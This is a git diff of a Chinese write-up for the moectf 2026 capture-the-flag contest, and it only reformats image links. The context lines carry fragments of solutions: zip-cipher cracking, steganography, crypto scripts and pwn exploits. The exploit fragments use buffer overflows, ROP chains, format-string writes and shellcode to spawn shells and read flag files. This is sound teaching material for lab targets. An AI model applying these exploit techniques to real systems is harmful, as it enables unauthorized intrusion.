 tar -xOf blobs/sha256/b021f16e614673fbd3af42ef46531ed2c4b3b400bba6291345e3c0101d56dd6d var/cache/.system/cache_meta.log
 ```
 
-![image-20260824103624390](./media/moectf 2026/image-20260824103624390.png)
+![image-20260824103624390](<./media/moectf 2026/image-20260824103624390.png>)
 
 图片提取出来了我们打开：
 
-![cache_meta](./media/moectf 2026/cache_meta.png)
+![cache_meta](<./media/moectf 2026/cache_meta.png>)
 
-![e186f6e89481acd7322a2a6e8ec23892](./media/moectf 2026/e186f6e89481acd7322a2a6e8ec23892.jpg)
+![e186f6e89481acd7322a2a6e8ec23892](<./media/moectf 2026/e186f6e89481acd7322a2a6e8ec23892.jpg>)
 
 ### Polyglot
 
@@ -5718,7 +5718,7 @@ tar -xOf blobs/sha256/b021f16e614673fbd3af42ef46531ed2c4b3b400bba6291345e3c0101d
 
 **bash：**
 
-![image-20260820210442106](./media/moectf 2026/image-20260820210442106.png)
+![image-20260820210442106](<./media/moectf 2026/image-20260820210442106.png>)
 
 ```bash
 part2: o0_!g1fel1_un1
@@ -5730,7 +5730,7 @@ part2: o0_!g1fel1_un1
 exec(chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(39)+chr(112)+chr(97)+chr(114)+chr(116)+chr(49)+chr(58)+chr(32)+chr(109)+chr(112)+chr(116)+chr(110)+chr(110)+chr(95)+chr(95)+chr(111)+chr(48)+chr(95)+chr(33)+chr(103)+chr(49)+chr(102)+chr(39)+chr(41))
 ```
 
-![image-20260820210855016](./media/moectf 2026/image-20260820210855016.png)
+![image-20260820210855016](<./media/moectf 2026/image-20260820210855016.png>)
 
 ```python
 part1: mptnn__o0_!g1f
@@ -5744,7 +5744,7 @@ puts "\160\141\162\164\064\072\040\143\171\163\067\064\137\154\164\147\137\137\1
 BEGIN { printf "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c", 112,97,114,116,51,58,32,101,108,49,95,117,110,49,99,121,115,55,52,95,108,10 }
 ```
 
-![image-20260820211211674](./media/moectf 2026/image-20260820211211674.png)
+![image-20260820211211674](<./media/moectf 2026/image-20260820211211674.png>)
 
 ```txt
 part3: el1_un1cys74_l
@@ -5758,7 +5758,7 @@ part4: cys74_ltg__g03
 { print pack("C*", 112,97,114,116,53,58,32,116,103,95,95,103,48,51,102,108,102,108,51,110,125,10); exit; }
 ```
 
-![image-20260820211406814](./media/moectf 2026/image-20260820211406814.png)
+![image-20260820211406814](<./media/moectf 2026/image-20260820211406814.png>)
 
 ```bash
 part5: tg__g03flfl3n}
@@ -5770,7 +5770,7 @@ part5: tg__g03flfl3n}
 (display "\x70;\x61;\x72;\x74;\x36;\x3a;\x20;\x66;\x6c;\x66;\x6c;\x33;\x6e;\x7d;\x7b;\x30;\x75;\x34;\x73;\x33;\x0a;")
 ```
 
-![image-20260820211736067](./media/moectf 2026/image-20260820211736067.png)
+![image-20260820211736067](<./media/moectf 2026/image-20260820211736067.png>)
 
 ```txt
 part6: flfl3n}{0u4s3
@@ -5780,7 +5780,7 @@ part6: flfl3n}{0u4s3
 
 使用在线解释器https://www.dcode.fr/whitespace-language：
 
-![image-20260820212838007](./media/moectf 2026/image-20260820212838007.png)
+![image-20260820212838007](<./media/moectf 2026/image-20260820212838007.png>)
 
 ```
 rt7: {0u4s3mptnn__
@@ -5810,7 +5810,7 @@ moectf{p0lygl0t_1s_fun!_7_l4ngu4g3s_1n_0n3_f1l3}
 
 题目标签贴了个base解码，然后颜文字VSCode也有提示：
 
-![image-20260821171743434](./media/moectf 2026/image-20260821171743434.png)
+![image-20260821171743434](<./media/moectf 2026/image-20260821171743434.png>)
 
 这种字符明显的base100编码，解码脚本：
 
@@ -5887,13 +5887,13 @@ flag = base64.b32decode(b32_str).decode()
 print(flag)
 ```
 
-![image-20260821173136828](./media/moectf 2026/image-20260821173136828.png)
+![image-20260821173136828](<./media/moectf 2026/image-20260821173136828.png>)
 
 ### 一线生机
 
 扔到HXD发现是个伪加密：
 
-![image-20260821173847774](./media/moectf 2026/image-20260821173847774.png)
+![image-20260821173847774](<./media/moectf 2026/image-20260821173847774.png>)
 
 搜 `09 00`，把`50 4B 03 04 14 00`后面的以及`50 4B 01 02 14 00 14 00`后面的都改成`00 00`，保存重新解压缩，失败了，看样子不是伪加密
 
@@ -5916,7 +5916,7 @@ python -c "from pathlib import Path; Path('known_readme.md').write_bytes('有时
   -j 4
 ```
 
-![image-20260821220911422](./media/moectf 2026/image-20260821220911422.png)
+![image-20260821220911422](<./media/moectf 2026/image-20260821220911422.png>)
 
 拿到ZipCrypto的三个密钥，我们再次用bkcrack和密钥解flag：
 
@@ -5934,7 +5934,7 @@ python -c "from pathlib import Path; Path('known_readme.md').write_bytes('有时
 Get-Content '.\flag.txt.decrypted' -Raw -Encoding utf8
 ```
 
-![image-20260821221315635](./media/moectf 2026/image-20260821221315635.png)
+![image-20260821221315635](<./media/moectf 2026/image-20260821221315635.png>)
 
 ### 你会git吗？
 
@@ -5944,7 +5944,7 @@ Get-Content '.\flag.txt.decrypted' -Raw -Encoding utf8
 git log --all --oneline --graph --decorate
 ```
 
-![image-20260821180640475](./media/moectf 2026/image-20260821180640475.png)
+![image-20260821180640475](<./media/moectf 2026/image-20260821180640475.png>)
 
 查看每次修改的内容：
 
@@ -5960,7 +5960,7 @@ git log --all -p
 git reflog
 ```
 
-![image-20260821181056951](./media/moectf 2026/image-20260821181056951.png)
+![image-20260821181056951](<./media/moectf 2026/image-20260821181056951.png>)
 
 尝试查看特定提交的内容：
 
@@ -5968,7 +5968,7 @@ git reflog
 git show 77a8f93:flag.txt
 ```
 
-![image-20260821181318396](./media/moectf 2026/image-20260821181318396.png)
+![image-20260821181318396](<./media/moectf 2026/image-20260821181318396.png>)
 
 提示说git端暂存，去暂存区看看：
 
@@ -5976,7 +5976,7 @@ git show 77a8f93:flag.txt
 git show :flag.txt
 ```
 
-![image-20260821181444571](./media/moectf 2026/image-20260821181444571.png)
+![image-20260821181444571](<./media/moectf 2026/image-20260821181444571.png>)
 
 解密：
 
@@ -5985,13 +5985,13 @@ import base64
 print(base64.b64decode("ZzE3XzE1X3NvXzNhU3k="))
 ```
 
-![image-20260821181543950](./media/moectf 2026/image-20260821181543950.png)
+![image-20260821181543950](<./media/moectf 2026/image-20260821181543950.png>)
 
 ### 半部电台
 
 先用`file`查一下附件：
 
-![image-20260821194715784](./media/moectf 2026/image-20260821194715784.png)
+![image-20260821194715784](<./media/moectf 2026/image-20260821194715784.png>)
 
 是个音频文件没问题，那我们就用sstv直接运行将音频转换成图片：
 
@@ -6005,7 +6005,7 @@ sstv -d ~/moectf2026/flag_0002.wav -o ~/moectf2026/flag.png
 feh ~/moectf2026/flag.png
 ```
 
-![image-20260821194842135](./media/moectf 2026/image-20260821194842135.png)
+![image-20260821194842135](<./media/moectf 2026/image-20260821194842135.png>)
 
 ### 霜雪千年
 
@@ -6046,7 +6046,7 @@ $raw = [IO.File]::ReadAllText('.\flag.txt')
 $raw.Replace("`t", '<TAB>').Replace(' ', '<SP>')
 ```
 
-![image-20260822105635748](./media/moectf 2026/image-20260822105635748.png)
+![image-20260822105635748](<./media/moectf 2026/image-20260822105635748.png>)
 
 正文后面全是空格和tab，又是一个空白语法，考点应该是stegsnow空白隐写：第一个 Tab 标记隐写数据开始，后续以“若干空格 + Tab”为一组，空格数的低 3 位是一个 3-bit 值，密码模式下，载荷还经过 ICE 的 1-bit CFB 加密
 
@@ -6054,7 +6054,7 @@ $raw.Replace("`t", '<TAB>').Replace(' ', '<SP>')
 
 先找密码：梨花香，缠着衣角掠过熙攘~出自歌词《霜雪千年》，然后题词“愿今生再相见”下一句：
 
-![image-20260822110403942](./media/moectf 2026/image-20260822110403942.png)
+![image-20260822110403942](<./media/moectf 2026/image-20260822110403942.png>)
 
 我们试这个为密码：
 
@@ -6062,25 +6062,25 @@ $raw.Replace("`t", '<TAB>').Replace(' ', '<SP>')
 stegsnow -p '消融你眉间悲戚霜雪' flag.txt
 ```
 
-![image-20260822110442894](./media/moectf 2026/image-20260822110442894.png)
+![image-20260822110442894](<./media/moectf 2026/image-20260822110442894.png>)
 
 ### Wedge in the Wire
 
 提供了一个wireshark文件，wires hark打开先看看统计的数据类型：
 
-![image-20260821225123771](./media/moectf 2026/image-20260821225123771.png)
+![image-20260821225123771](<./media/moectf 2026/image-20260821225123771.png>)
 
 先把HTTP提取出来：
 
-![image-20260821225305469](./media/moectf 2026/image-20260821225305469.png)
+![image-20260821225305469](<./media/moectf 2026/image-20260821225305469.png>)
 
-![image-20260821225332927](./media/moectf 2026/image-20260821225332927.png)
+![image-20260821225332927](<./media/moectf 2026/image-20260821225332927.png>)
 
 然后就能拿到flag和对照表：
 
-![duizhao](./media/moectf 2026/duizhao.jpg)
+![duizhao](<./media/moectf 2026/duizhao.jpg>)
 
-![28dc7a1c0124ba718e001866f17a8e26](./media/moectf 2026/28dc7a1c0124ba718e001866f17a8e26.jpg)
+![28dc7a1c0124ba718e001866f17a8e26](<./media/moectf 2026/28dc7a1c0124ba718e001866f17a8e26.jpg>)
 
 对下来的英文：`mystic script in raputa`
 
@@ -6096,7 +6096,7 @@ pcap文件我们还是拿wires hark打开，里面全是USB协议，我们得分
 
 能返回数据：
 
-![image-20260824010227680](./media/moectf 2026/image-20260824010227680.png)
+![image-20260824010227680](<./media/moectf 2026/image-20260824010227680.png>)
 
 说明该pcap使用的是 `usbhid.data` 字段，我们导出所有数据：
 
@@ -6116,7 +6116,7 @@ pcap文件我们还是拿wires hark打开，里面全是USB协议，我们得分
 Get-Content full_data.txt | ForEach-Object { ($_ -split '\s+')[0] } | Group-Object | Sort-Object Count -Descending
 ```
 
-![image-20260824012057943](./media/moectf 2026/image-20260824012057943.png)
+![image-20260824012057943](<./media/moectf 2026/image-20260824012057943.png>)
 
 我们看看这俩组的值发现第二组更符合键盘：Byte 1 永远为 `0`，Byte 2 是键码（`04`~`52`）
 
@@ -6179,7 +6179,7 @@ for line in lines:
 print(' '.join(events))
 ```
 
-![image-20260824015031384](./media/moectf 2026/image-20260824015031384.png)
+![image-20260824015031384](<./media/moectf 2026/image-20260824015031384.png>)
 
 我们给翻译成flag：
 
@@ -6257,9 +6257,9 @@ io.interactive()
 docker exec -w /CTF -e TERM=xterm-256color -u ubuntu -it pwn24 bash
 ```
 
-![image-20260816003004884](./media/moectf 2026/image-20260816003004884.png)
+![image-20260816003004884](<./media/moectf 2026/image-20260816003004884.png>)
 
-![image-20260816122542119](./media/moectf 2026/image-20260816122542119.png)
+![image-20260816122542119](<./media/moectf 2026/image-20260816122542119.png>)
 
 ### 走后门
 
@@ -6308,9 +6308,9 @@ int backdoor()
 
 我们需要拿到backdoor的地址：
 
-![image-20260816134349003](./media/moectf 2026/image-20260816134349003.png)
+![image-20260816134349003](<./media/moectf 2026/image-20260816134349003.png>)
 
-![image-20260816140327284](./media/moectf 2026/image-20260816140327284.png)
+![image-20260816140327284](<./media/moectf 2026/image-20260816140327284.png>)
 
  尝试攻击脚本：
 
@@ -6331,11 +6331,11 @@ p.send(payload)
 p.interactive()
 ```
 
-![image-20260816142828705](./media/moectf 2026/image-20260816142828705.png)
+![image-20260816142828705](<./media/moectf 2026/image-20260816142828705.png>)
 
 进程跳进backdoor后收到SIGSEGV 并退出，我们需要加一个ret做对齐：
 
-![image-20260816143110781](./media/moectf 2026/image-20260816143110781.png)
+![image-20260816143110781](<./media/moectf 2026/image-20260816143110781.png>)
 
 最终脚本：
 
@@ -6360,13 +6360,13 @@ p.interactive()
 
 成功拿到shell：
 
-![image-20260816143246223](./media/moectf 2026/image-20260816143246223.png)
+![image-20260816143246223](<./media/moectf 2026/image-20260816143246223.png>)
 
 ### Hello-World01
 
 检查保护机制：
 
-![image-20260816194249258](./media/moectf 2026/image-20260816194249258.png)
+![image-20260816194249258](<./media/moectf 2026/image-20260816194249258.png>)
 
 从结果来看可以得到的结论：没有栈保护；“NX enabled”说明栈不可执行，不能直接 shellcode，必须 ROP；“No PIE”说明代码段地址固定，GOT/PLT 地址可以直接用
 
@@ -6427,7 +6427,7 @@ payload = b'A' * 0x48 + p64(ret_addr)
 
 接下来我们还需要查一下libc文件信息：
 
-![image-20260816195249638](./media/moectf 2026/image-20260816195249638.png)
+![image-20260816195249638](<./media/moectf 2026/image-20260816195249638.png>)
 
 这道题的明确思路应该是在vuln()里构造ROP（返回导向编程）：
 
@@ -6480,11 +6480,11 @@ p.sendlineafter(b'pwn skill:', payload)
 p.interactive()
 ```
 
-![image-20260816204905070](./media/moectf 2026/image-20260816204905070.png)
+![image-20260816204905070](<./media/moectf 2026/image-20260816204905070.png>)
 
-![image-20260816204933270](./media/moectf 2026/image-20260816204933270.png)
+![image-20260816204933270](<./media/moectf 2026/image-20260816204933270.png>)
 
-![image-20260816204952705](./media/moectf 2026/image-20260816204952705.png)
+![image-20260816204952705](<./media/moectf 2026/image-20260816204952705.png>)
 
 ### ezpwn01
 
@@ -6518,9 +6518,9 @@ p.recvuntil(b'\r\n\r\n')
 p.interactive()
 ```
 
-![image-20260817091826301](./media/moectf 2026/image-20260817091826301.png)
+![image-20260817091826301](<./media/moectf 2026/image-20260817091826301.png>)
 
-![image-20260817091854421](./media/moectf 2026/image-20260817091854421.png)
+![image-20260817091854421](<./media/moectf 2026/image-20260817091854421.png>)
 
 从输出明确了只允许GET请求，好像没办法交互呢，尝试发送一个带请求体的GET请求并将shellcode放在请求体：
 
@@ -6552,7 +6552,7 @@ p.interactive()
 
 返回了浏览器前端源代码：
 
-![image-20260817092833948](./media/moectf 2026/image-20260817092833948.png)
+![image-20260817092833948](<./media/moectf 2026/image-20260817092833948.png>)
 
 我们现在还需要后端执行代码的API，首先获取`/static/main.js`看看具体接口：
 
@@ -6654,7 +6654,7 @@ async def exploit():
 asyncio.run(exploit())
 ```
 
-![image-20260817095139023](./media/moectf 2026/image-20260817095139023.png)
+![image-20260817095139023](<./media/moectf 2026/image-20260817095139023.png>)
 
 ### ezpwn02
 
@@ -6692,7 +6692,7 @@ objcopy -O binary stage1.o stage1.bin
 xxd -p stage1.bin          # 或者 od -An -tx1 stage1.bin
 ```
 
-![image-20260817110821184](./media/moectf 2026/image-20260817110821184.png)
+![image-20260817110821184](<./media/moectf 2026/image-20260817110821184.png>)
 
 然后写stag2：
 
@@ -6718,7 +6718,7 @@ print(shellcraft.exit(0))
 '
 ```
 
-![image-20260817111329767](./media/moectf 2026/image-20260817111329767.png)
+![image-20260817111329767](<./media/moectf 2026/image-20260817111329767.png>)
 
 根据分析最终攻击脚本：
 
@@ -6765,13 +6765,13 @@ p.send(payload)
 p.interactive()
 ```
 
-![image-20260817103817660](./media/moectf 2026/image-20260817103817660.png)
+![image-20260817103817660](<./media/moectf 2026/image-20260817103817660.png>)
 
 ### omg电台出问题了
 
 提供了一个文件附件，先查看保护机制：
 
-![image-20260817132906361](./media/moectf 2026/image-20260817132906361.png)
+![image-20260817132906361](<./media/moectf 2026/image-20260817132906361.png>)
 
 程序固定加载在 `0x400000`，所有地址都是固定的可直接写死，有栈金丝雀，栈不可执行不能直接塞shellcode
 
@@ -6824,7 +6824,7 @@ __int64 repair_complete()
 
 我们查一下`repair_complete()`的地址写死地址：
 
-![image-20260817135526840](./media/moectf 2026/image-20260817135526840.png)
+![image-20260817135526840](<./media/moectf 2026/image-20260817135526840.png>)
 
 最终攻击脚本：
 
@@ -6847,13 +6847,13 @@ p.sendafter(b'Enter repair ciphertext:', bytes([len(payload)]) + payload)
 p.interactive()
 ```
 
-![image-20260817135735393](./media/moectf 2026/image-20260817135735393.png)
+![image-20260817135735393](<./media/moectf 2026/image-20260817135735393.png>)
 
 ### 灯神的愿望
 
 先查文件的保护机制：
 
-![image-20260817171612470](./media/moectf 2026/image-20260817171612470.png)
+![image-20260817171612470](<./media/moectf 2026/image-20260817171612470.png>)
 
 IDA反汇编查main主要是这么一个循环：
 
@@ -6914,13 +6914,13 @@ p.sendline(b'cat /flag*')
 p.sendline(b'id')
 ```
 
-![image-20260817173408594](./media/moectf 2026/image-20260817173408594.png)
+![image-20260817173408594](<./media/moectf 2026/image-20260817173408594.png>)
 
 ### 斯兰德先生的秘密
 
 首先检查文件的保护机制：
 
-![image-20260817232919859](./media/moectf 2026/image-20260817232919859.png)
+![image-20260817232919859](<./media/moectf 2026/image-20260817232919859.png>)
 
 没有传统的内存破坏漏洞只能从程序本身的逻辑找漏洞
 
@@ -7126,11 +7126,11 @@ for offset in range(-3, 4):
         p.close()
 ```
 
-![image-20260818001523823](./media/moectf 2026/image-20260818001523823.png)
+![image-20260818001523823](<./media/moectf 2026/image-20260818001523823.png>)
 
 ### 没有后门
 
-![image-20260827173348598](./media/moectf 2026/image-20260827173348598.png)
+![image-20260827173348598](<./media/moectf 2026/image-20260827173348598.png>)
 
 main函数只有init() + vuln()：
 
@@ -7160,7 +7160,7 @@ __int64 vuln()
 
 题目就叫没有后门，把IDA打开搜字符串发现明确存在"/bin/sh" 字符串：
 
-![image-20260827173751514](./media/moectf 2026/image-20260827173751514.png)
+![image-20260827173751514](<./media/moectf 2026/image-20260827173751514.png>)
 
 还有一个sh的字符指向它，我们只要把寄存器设置成执行`execve("/bin/sh", NULL, NULL)` 需要的样子，然后执行一条 syscall 指令，就能直接得到 shell，我们需要明确扒出来，先搜字符串和符号：
 
@@ -7230,13 +7230,13 @@ p.sendlineafter(b'backdoor?', payload)
 p.interactive()
 ```
 
-![image-20260827175727582](./media/moectf 2026/image-20260827175727582.png)
+![image-20260827175727582](<./media/moectf 2026/image-20260827175727582.png>)
 
 ### 百万英镑
 
 我们先查一下所提供程序的保护机制：
 
-![image-20260818002644571](./media/moectf 2026/image-20260818002644571.png)
+![image-20260818002644571](<./media/moectf 2026/image-20260818002644571.png>)
 
 IDA分析：
 
@@ -7283,7 +7283,7 @@ __int64 __fastcall cheque_bytes(int a1)
 
 在IDA中搜`/bin/sh`定位到`staff_room`函数：
 
-![image-20260818003641019](./media/moectf 2026/image-20260818003641019.png)
+![image-20260818003641019](<./media/moectf 2026/image-20260818003641019.png>)
 
 ```c++
 int staff_room()
@@ -7320,13 +7320,13 @@ p.send(payload)
 p.interactive()
 ```
 
-![image-20260818010236596](./media/moectf 2026/image-20260818010236596.png)
+![image-20260818010236596](<./media/moectf 2026/image-20260818010236596.png>)
 
 ### onlyshell
 
 先检查保护机制：
 
-![image-20260818105144187](./media/moectf 2026/image-20260818105144187.png)
+![image-20260818105144187](<./media/moectf 2026/image-20260818105144187.png>)
 
 所有常见的防御机制几乎全开了，漏洞就很难找了，先分析分析文件再说吧
 
@@ -7492,13 +7492,13 @@ if __name__ == "__main__":
     main()
 ```
 
-![image-20260818131635579](./media/moectf 2026/image-20260818131635579.png)
+![image-20260818131635579](<./media/moectf 2026/image-20260818131635579.png>)
 
 ### 小蜜蜂
 
 查看文件保护机制：
 
-![image-20260818132129141](./media/moectf 2026/image-20260818132129141.png)
+![image-20260818132129141](<./media/moectf 2026/image-20260818132129141.png>)
 
 这次需要注意的是PIE开启了每次的运行基址随机了我们不能再用固定的基址了，需要泄露地址
 
@@ -7514,7 +7514,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 
 v6的内存布局视图：
 
-![image-20260818135709754](./media/moectf 2026/image-20260818135709754.png)
+![image-20260818135709754](<./media/moectf 2026/image-20260818135709754.png>)
 
 `v6[-1]` 正好位于 `p_p_ordinary_bell` 的位置。如果能向 `v6[-1]` 写入任意值，即可控制函数指针
 
@@ -7581,7 +7581,7 @@ unsigned __int64 read_pickup_code()
 
 找找能不能找到后门函数：
 
-![image-20260818132933177](./media/moectf 2026/image-20260818132933177.png)
+![image-20260818132933177](<./media/moectf 2026/image-20260818132933177.png>)
 
 ```c++
 int staff_room()
@@ -7611,9 +7611,9 @@ int __fastcall show_records(const void **p_p_ordinary_bell)
 
 直接算出程序的基址，进而可以算出后门函数的地址：
 
-![image-20260818141255924](./media/moectf 2026/image-20260818141255924.png)
+![image-20260818141255924](<./media/moectf 2026/image-20260818141255924.png>)
 
-![image-20260818141113640](./media/moectf 2026/image-20260818141113640.png)
+![image-20260818141113640](<./media/moectf 2026/image-20260818141113640.png>)
 
 `0x13A8 - 0x138E = 0x1A`，因此，
 
@@ -7648,11 +7648,11 @@ p.sendlineafter(b'> ', b'3')
 p.interactive()
 ```
 
-![image-20260818134617728](./media/moectf 2026/image-20260818134617728.png)
+![image-20260818134617728](<./media/moectf 2026/image-20260818134617728.png>)
 
 ### 校庆抽奖后台
 
-![image-20260818171247113](./media/moectf 2026/image-20260818171247113.png)
+![image-20260818171247113](<./media/moectf 2026/image-20260818171247113.png>)
 
 IDA分析main函数，先把输入输出以及多余的分支都去掉留下要进的if线：
 
@@ -7698,7 +7698,7 @@ unsigned __int64 __fastcall submit_claim(size_t n0x100)
 
 然后找后门函数找到了一个直接出flag的位置：
 
-![image-20260818172116327](./media/moectf 2026/image-20260818172116327.png)
+![image-20260818172116327](<./media/moectf 2026/image-20260818172116327.png>)
 
 ```c++
 unsigned __int64 award_jackpot()
@@ -7754,11 +7754,11 @@ p.send(payload)
 print(p.recvall(timeout=2).decode())
 ```
 
-![image-20260818180448689](./media/moectf 2026/image-20260818180448689.png)
+![image-20260818180448689](<./media/moectf 2026/image-20260818180448689.png>)
 
 ### 自助打印机
 
-![image-20260825110420179](./media/moectf 2026/image-20260825110420179.png)
+![image-20260825110420179](<./media/moectf 2026/image-20260825110420179.png>)
 
 ```c++
 int __fastcall main(int argc, const char **argv, const char **envp)
@@ -7891,11 +7891,11 @@ out = p.recvall(timeout=8)
 print(out.decode(errors='ignore'))
 ```
 
-![image-20260825215747549](./media/moectf 2026/image-20260825215747549.png)
+![image-20260825215747549](<./media/moectf 2026/image-20260825215747549.png>)
 
 ### 外卖补贴
 
-![image-20260818195645767](./media/moectf 2026/image-20260818195645767.png)
+![image-20260818195645767](<./media/moectf 2026/image-20260818195645767.png>)
 
 ```c++
 int __fastcall main(int argc, const char **argv, const char **envp)
@@ -7963,13 +7963,13 @@ int __fastcall preview_slogan(const char *format)
 
 选项3调用了一个全局函数指针：
 
-![image-20260818214838015](./media/moectf 2026/image-20260818214838015.png)
+![image-20260818214838015](<./media/moectf 2026/image-20260818214838015.png>)
 
 在.bss段是全局变量，相对于程序基址而言它的地址是固定的，可以利用选项2的漏洞将这个函数指针改成后门函数
 
 找后门函数：
 
-![image-20260818200545967](./media/moectf 2026/image-20260818200545967.png)
+![image-20260818200545967](<./media/moectf 2026/image-20260818200545967.png>)
 
 ```c++
 int director_channel()
@@ -7987,13 +7987,13 @@ int director_channel()
 
 攻击地图大体确定了，首先需要找到所有地址的静态偏移：
 
-![image-20260818215832118](./media/moectf 2026/image-20260818215832118.png)
+![image-20260818215832118](<./media/moectf 2026/image-20260818215832118.png>)
 
 然后还需要搞清楚输入的数据在printf里是第几个参数，gdb调试试试：
 
-![image-20260818222150721](./media/moectf 2026/image-20260818222150721.png)
+![image-20260818222150721](<./media/moectf 2026/image-20260818222150721.png>)
 
-![image-20260818222304067](./media/moectf 2026/image-20260818222304067.png)
+![image-20260818222304067](<./media/moectf 2026/image-20260818222304067.png>)
 
 `%10$p` 打印出来的数字，就是输入 “AAAA.%1$” 的十六进制形态，也就是说printf在读取第10个参数的时候刚好读到输入字符串的开头位置
 
@@ -8040,7 +8040,7 @@ p.sendline(b'3')
 p.interactive()
 ```
 
-![image-20260818204149598](./media/moectf 2026/image-20260818204149598.png)
+![image-20260818204149598](<./media/moectf 2026/image-20260818204149598.png>)
 
 ### ezstl
 
@@ -8133,7 +8133,7 @@ badge.vptr = custom_style
 
 IDA搜一下找到后门函数了欸：
 
-![image-20260825120515198](./media/moectf 2026/image-20260825120515198.png)
+![image-20260825120515198](<./media/moectf 2026/image-20260825120515198.png>)
 
 ```c++
 unsigned __int64 sub_1329()
@@ -8176,13 +8176,13 @@ io.sendafter(b'style data: ', str(win).encode() + b'\n')
 io.interactive()
 ```
 
-![image-20260825134408527](./media/moectf 2026/image-20260825134408527.png)
+![image-20260825134408527](<./media/moectf 2026/image-20260825134408527.png>)
 
 ## 策略与博弈
 
 ### 繁华世界
 
-![image-20260819172705103](./media/moectf 2026/image-20260819172705103.png)
+![image-20260819172705103](<./media/moectf 2026/image-20260819172705103.png>)
 
 ### 神之泥肘
 
@@ -8190,13 +8190,13 @@ io.interactive()
 
 通关的三个点位：
 
-![image-20260819131022909](./media/moectf 2026/image-20260819131022909.png)
+![image-20260819131022909](<./media/moectf 2026/image-20260819131022909.png>)
 
-![image-20260819131107286](./media/moectf 2026/image-20260819131107286.png)
+![image-20260819131107286](<./media/moectf 2026/image-20260819131107286.png>)
 
-![image-20260819131145507](./media/moectf 2026/image-20260819131145507.png)
+![image-20260819131145507](<./media/moectf 2026/image-20260819131145507.png>)
 
-![image-20260819130017210](./media/moectf 2026/image-20260819130017210.png)
+![image-20260819130017210](<./media/moectf 2026/image-20260819130017210.png>)
 
 ### moemaze
 
@@ -8377,7 +8377,7 @@ const bytes = fs.readFileSync('game.wasm');
 
 然后我们找到一天从 `(1,1)` 到 `(24,16)` 的路径：
 
-![image-20260827165414322](./media/moectf 2026/image-20260827165414322.png)
+![image-20260827165414322](<./media/moectf 2026/image-20260827165414322.png>)
 
 然后我们提交路径服务器验证后返回flag：
 
@@ -8387,7 +8387,7 @@ curl -X POST http://127.0.0.1:26472/api/claim \
      -d '{"seed":151426575,"path":"上面的路径"}'
 ```
 
-![image-20260827165507915](./media/moectf 2026/image-20260827165507915.png)
+![image-20260827165507915](<./media/moectf 2026/image-20260827165507915.png>)
 
 ## 现代密码学
 
@@ -8415,7 +8415,7 @@ print(" flag =", flag)
 print(" FLAG =", flag.decode())
 ```
 
-![image-20260827170033713](./media/moectf 2026/image-20260827170033713.png)
+![image-20260827170033713](<./media/moectf 2026/image-20260827170033713.png>)
 
 ### moeSign1n
 
@@ -8461,13 +8461,13 @@ print(r.recvall().decode())
 
 然后我们通过加密2，4，3，9来恢复服务器的模数n然后加密目标明文并提交取flag：
 
-![image-20260827195533829](./media/moectf 2026/image-20260827195533829.png)
+![image-20260827195533829](<./media/moectf 2026/image-20260827195533829.png>)
 
 ### wsl_Sign1n
 
 根据md搭环境：
 
-![image-20260827203113780](./media/moectf 2026/image-20260827203113780.png)
+![image-20260827203113780](<./media/moectf 2026/image-20260827203113780.png>)
 
 ### justXOR
 
@@ -8489,7 +8489,7 @@ flag = bytes([x ^ y for x, y in zip(enc, key_bytes)])
 print(flag)
 ```
 
-![image-20260827231843935](./media/moectf 2026/image-20260827231843935.png)
+![image-20260827231843935](<./media/moectf 2026/image-20260827231843935.png>)
 
 ### the_KEY_of_DES
 
@@ -8497,7 +8497,7 @@ print(flag)
 
 0000000000000000和0101010101010101(输入是十六进制)
 
-![image-20260828225514932](./media/moectf 2026/image-20260828225514932.png)
+![image-20260828225514932](<./media/moectf 2026/image-20260828225514932.png>)
 
 ### 1391 超市
 
@@ -8549,7 +8549,7 @@ if __name__ == "__main__":
     main()
 ```
 
-![image-20260829013959842](./media/moectf 2026/image-20260829013959842.png)
+![image-20260829013959842](<./media/moectf 2026/image-20260829013959842.png>)
 
 我们发现缺第12字节数据于是我们去查一下最后几行的输出结果看看什么情况：
 
@@ -8557,7 +8557,7 @@ if __name__ == "__main__":
 tail -n 20 output.txt
 ```
 
-![image-20260828232904055](./media/moectf 2026/image-20260828232904055.png)
+![image-20260828232904055](<./media/moectf 2026/image-20260828232904055.png>)
 
 说明第12字节的数据改用了直接爆破，那我们直接查state为true的那一行即可：
 
@@ -8565,7 +8565,7 @@ tail -n 20 output.txt
 grep -i '"state": true' output.txt
 ```
 
-![image-20260828233024703](./media/moectf 2026/image-20260828233024703.png)
+![image-20260828233024703](<./media/moectf 2026/image-20260828233024703.png>)
 
 最后全部拼接下来就是flag：`moectf{abed11be2e115680f30bd4f0d2}`
 
@@ -8600,7 +8600,7 @@ flag = m.to_bytes((m.bit_length() + 7) // 8, 'big')
 print(flag)
 ```
 
-![image-20260829120301988](./media/moectf 2026/image-20260829120301988.png)
+![image-20260829120301988](<./media/moectf 2026/image-20260829120301988.png>)
 
 ### ez_fermat
 
@@ -8645,7 +8645,7 @@ flag = long_to_bytes(m)
 print(f"Flag = {flag}")
 ```
 
-![image-20260829164236464](./media/moectf 2026/image-20260829164236464.png)
+![image-20260829164236464](<./media/moectf 2026/image-20260829164236464.png>)
 
 ### moePoly1
 
@@ -8742,7 +8742,7 @@ if __name__ == "__main__":
     main()
 ```
 
-![image-20260829231433803](./media/moectf 2026/image-20260829231433803.png)
+![image-20260829231433803](<./media/moectf 2026/image-20260829231433803.png>)
 
 ### moePoly3
 
@@ -8750,7 +8750,7 @@ if __name__ == "__main__":
 
 我们要求解这道题就需要选择合适的基数，256比较合适，因为最大的数$\sum_{i=0}^{30} 255 \cdot 256^i = 256^{31}-1 = 2^{248}-1$也小于模数$p$（$p\ge 2^{255}$）于是求出来的值就是精确的整数值，于是：
 
-![image-20260830120428545](./media/moectf 2026/image-20260830120428545.png)
+![image-20260830120428545](<./media/moectf 2026/image-20260830120428545.png>)
 
 我们把y转回base-256即可唯一恢复全部系数再按照题目拼回去：
 
@@ -8765,7 +8765,7 @@ target = int(''.join(str(c) for c in coef))
 print(target)
 ```
 
-![image-20260830120759532](./media/moectf 2026/image-20260830120759532.png)
+![image-20260830120759532](<./media/moectf 2026/image-20260830120759532.png>)
 
 ### XOR_revenge
 
@@ -8822,7 +8822,7 @@ flag = bytes([x ^ y for x, y in zip(enc, key_bytes)])
 print(flag.decode())
 ```
 
-![image-20260829223051412](./media/moectf 2026/image-20260829223051412.png)
+![image-20260829223051412](<./media/moectf 2026/image-20260829223051412.png>)
 
 ### 墨箓验真
 
